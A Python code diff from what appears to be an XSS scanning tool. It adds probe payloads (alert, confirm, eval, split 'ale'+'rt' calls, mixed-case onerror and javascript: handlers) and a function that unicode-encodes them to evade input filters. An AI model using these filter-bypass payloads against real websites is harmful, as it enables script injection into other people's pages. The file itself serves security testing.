@@ -7,7 +7,8 @@ keyword = {
     'tag': [],
     'others': [],
     'illusion': [],
-    'combination_close_no':[]}
+    'combination_close_no':[],
+    'combination_close_yes':[]}
 
 
 def keyword_init():
@@ -41,7 +42,7 @@ def keyword_init():
 
     keyword['action'] = ["prompt(591)",
                          "prompt`591`",
-                         "confirm(591)"
+                         "confirm(591)",
                          "confirm`591`",
                          "alert(591)",
                          "alert`591`",
@@ -50,7 +51,8 @@ def keyword_init():
                          "window[`ale`%252b`rt`]`591`",
                          "window['ale'+'rt'](591)",
                          "window['ale'%2b'rt'](591)",
-                         "window['ale'%252b'rt'](591)"
+                         "window['ale'%252b'rt'](591)",
+                         "eval(591)"
                          ]
 
     keyword['onevent'] = ["oNwHeEl=591",
@@ -58,7 +60,11 @@ def keyword_init():
                           "OnmOuseOver=591",
                           "OnmoUseoUt=591",
                           "ONfoCus=591",
-                          "oNloAd=591",  # <body onload=alert(1)>
+                          "oNloAd=591", # <body onload=alert(1)>
+                          "oNErrOr=591",
+                          "SrC=591",
+                          # "eval(\""+''.join((r'\x%2x'%ord(c)for c in 'alert(591)'))+"\")", 会报错：bad escape \x at position 6，查询了下貌似是 python3 的问题
+                          # eval("\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29 \"), #这个动作可以和 onerror 搭配使用
                           "HReF=jAvAScRipt:591"]  # <A HReF=jAvAScRipt:591>aaaa</a>
     keyword['tag'] = ["<IfrAme>591</IfrAme>",
                       "<A>591</A>",
@@ -92,6 +98,10 @@ def keyword_init():
     keyword['combination_close_no'] = [
 
     ]
+    keyword['combination_close_yes'] = [
+
+    ]
+    payload2unicode()
     # [print(e) for e in keyword]
 
 
@@ -120,5 +130,28 @@ def keyword_(key):
         break
 
     # def keyword_add_clog(self):
-# if __name__ == '__main__':
-   # keyword_expand("\"'>")
+
+
+
+# 将 action[]中每个 payload 中的字母转换为 unicode 码 ———— 支持弹窗函数的 unicode 编码绕过方法
+def payload2unicode():
+    keyword['action_bak']=[]
+    for p0 in keyword['action']:
+        keyword['action_bak'].append(p0)
+
+    for p1 in keyword['action_bak']:
+        s2=""
+        for s in p1:
+            if s.isalpha() and s != "b":   # 避免出现将%252b 中的 b 编码，会造成无法解析
+                s2+=hex(ord(s)).replace("0x", "\\u00")
+            else:
+                s2+=s
+        print(s2)
+        keyword['action'].append(s2)
+
+
+if __name__ == '__main__':
+    keyword_init()
+    payload2unicode()
+    for p3 in keyword['action']:
+        print(p3)
